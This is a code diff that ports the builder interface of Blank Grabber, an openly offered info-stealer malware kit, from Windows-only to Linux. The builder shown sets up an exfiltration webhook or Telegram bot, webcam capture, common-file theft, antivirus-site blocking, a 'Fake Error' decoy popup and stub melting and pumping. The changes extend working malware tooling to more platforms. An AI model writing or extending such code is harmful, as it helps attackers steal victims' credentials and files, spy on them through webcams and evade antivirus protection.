@@ -8,6 +8,7 @@ import ast
 import webbrowser
 import random
 import string
+import platform
 
 import customtkinter as ctk
 from tkinter import messagebox, filedialog
@@ -29,17 +30,22 @@ class Utility:
 
 	@staticmethod
 	def ToggleConsole(choice: bool) -> None:
-		if choice:
-			# Show Console
-			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
-		else:
-			# Hide Console
-			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+		if sys.platform == "win32":
+			if choice:
+				# Show Console
+				ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
+			else:
+				# Hide Console
+				ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 	@staticmethod
 	def IsAdmin() -> bool:
 		try:
-			return ctypes.windll.shell32.IsUserAnAdmin() == 1
+			if sys.platform == "win32":
+				return ctypes.windll.shell32.IsUserAnAdmin() == 1
+			else:
+				# On Linux/Unix, check if running as root
+				return os.geteuid() == 0
 		except Exception:
 			return False
 		
@@ -69,11 +75,17 @@ class Utility:
 					_hash = json.loads(content)["hash"]
 					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
 
-					os.system("cls")
+					if sys.platform == "win32":
+						os.system("cls")
+					else:
+						os.system("clear")
 					return _hash != newhash # New update available
 				except Exception:
 					pass
-			os.system("cls")
+			if sys.platform == "win32":
+				os.system("cls")
+			else:
+				os.system("clear")
 		return False
 	
 	@staticmethod
@@ -157,7 +169,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
 		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
 
-		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
+		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback, daemon= True).start())
 		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
 		
 		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
@@ -172,7 +184,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
 		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)
 
-		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
+		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event)
 		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)
 
 		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
@@ -214,7 +226,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
 		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)
 
-		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
+		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event)
 		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)
 
 		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
@@ -512,7 +524,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 				try:
 					data = json.dumps({"content" : "Your webhook is working!"}).encode()
-					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36"})
 					status = http.status
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
@@ -563,7 +575,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 						try:
 							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
 							if not resp["ok"]:
-								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
+								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a group, the group id must be prefixed with a '-'.\n3) If the chat ID is of a private channel, the channel id must be prefixed with a '-100'.")
 								return
 							else:
 								if resp["result"].get("permissions"):
@@ -727,8 +739,18 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			message= "Message"
 			self.messageEntry.insert(0, message)
 		
-		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
-		subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+		if sys.platform == "win32":
+			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
+			subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+		else:
+			# Linux: Use zenity or notify-send
+			try:
+				subprocess.Popen(["notify-send", "-u", "critical", title, message])
+			except FileNotFoundError:
+				try:
+					subprocess.Popen(["zenity", "--error", "--title=" + title, "--text=" + message])
+				except FileNotFoundError:
+					messagebox.showinfo(title, message)
 	
 	def saveFakeError(self) -> None:
 		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
@@ -741,13 +763,19 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			self.destroy()
 
 		elif title.strip() == "":
-			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
-			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+			if sys.platform == "win32":
+				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''
+				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+			else:
+				messagebox.showerror("Error", "Title cannot be empty!")
 			return
 		
 		elif message.strip() == "":
-			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
-			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+			if sys.platform == "win32":
+				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''
+				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+			else:
+				messagebox.showerror("Error", "Message cannot be empty!")
 			return
 		
 		self.master.fakeErrorData = [True, (title, message, icon)]
@@ -778,7 +806,7 @@ class Builder(ctk.CTk):
 	
 	def BuildPythonFile(self, config: str) -> None:
 		options = json.loads(config)
-		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
+		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"))
 		if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
 			return
 		
@@ -813,42 +841,55 @@ class Builder(ctk.CTk):
 	
 	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
 		def Exit(code: int = 0) -> None:
-			os.system("pause > NUL")
+			if sys.platform == "win32":
+				os.system("pause > NUL")
+			input("Press Enter to exit...")
 			exit(code)
 		
 		def clear() -> None:
-			os.system("cls")
+			if sys.platform == "win32":
+				os.system("cls")
+			else:
+				os.system("clear")
 		
 		def format(title: str, description: str) -> str:
 			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
 		
 		self.destroy()
 		Utility.ToggleConsole(True)
-		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
+		
+		if sys.platform == "win32":
+			ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
+		
 		clear()
 
-		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
-			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
+		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")) and not os.path.isfile(os.path.join("env", "bin", "run.sh")):
+			activate_script = "Scripts/activate" if sys.platform == "win32" else "bin/activate"
+			if not os.path.isfile(os.path.join("env", activate_script)):
 				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
-				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
+				res = subprocess.run("python3 -m venv env" if sys.platform != "win32" else "python -m venv env", capture_output= True, shell= True)
 				clear()
 				if res.returncode != 0:
-					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
+					print('Error while creating virtual environment: {}'.format(res.stderr.decode(errors= "ignore")))
 					Exit(1)
 
 		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
+		scripts_dir = "Scripts" if sys.platform == "win32" else "bin"
 		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
 			if os.path.isfile(fileloc := os.path.join(datadir, i)):
-				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
+				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", scripts_dir, i))
 			else:
-				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
+				dest = os.path.join(os.path.dirname(__file__), "env", scripts_dir, i)
+				if os.path.exists(dest):
+					shutil.rmtree(dest)
+				shutil.copytree(fileloc, dest)
 
-		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
+		with open(os.path.join(os.path.dirname(__file__), "env", scripts_dir, "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(config)
 
 		clear()
 
-		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
+		os.chdir(os.path.join(os.path.dirname(__file__), "env", scripts_dir))
 
 		if os.path.isfile("icon.ico"):
 			os.remove("icon.ico")
@@ -863,27 +904,30 @@ class Builder(ctk.CTk):
 		if os.path.isfile(boundFilePath):
 			shutil.copy(boundFilePath, "bound.exe")
 
-		os.startfile("run.bat")
+		if sys.platform == "win32":
+			os.startfile("run.bat")
+		else:
+			subprocess.Popen(["bash", "run.sh"])
 
 if __name__ == "__main__":
 
-	if os.name == "nt":
+	if sys.platform == "win32":
 		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True)
 			exit(1)
 		
 		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
 		if not (parse_version(version) > parse_version("3.10")):
-			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True)
 			exit(1)
 		if "windowsapps" in sys.executable.lower():
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://www.python.org/downloads. The Windows Store version has limitations and we do not support it.\', 10, \'Error\', 16);close()"', shell= True)
 			exit(1)
 
 		Utility.CheckConfiguration()
 		
 		if Utility.CheckForUpdates():
-			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
+			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (Opens GitHub in your default browser)")
 			if response:
 				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
 				exit(0)
@@ -898,5 +942,13 @@ if __name__ == "__main__":
 		Builder().mainloop()
 
 	else:
-		print("Only Windows OS is supported!")
+		# Linux/Unix support
+		Utility.CheckConfiguration()
 		
+		if Utility.CheckForUpdates():
+			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (Opens GitHub in your default browser)")
+			if response:
+				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				exit(0)
+		
+		Builder().mainloop()
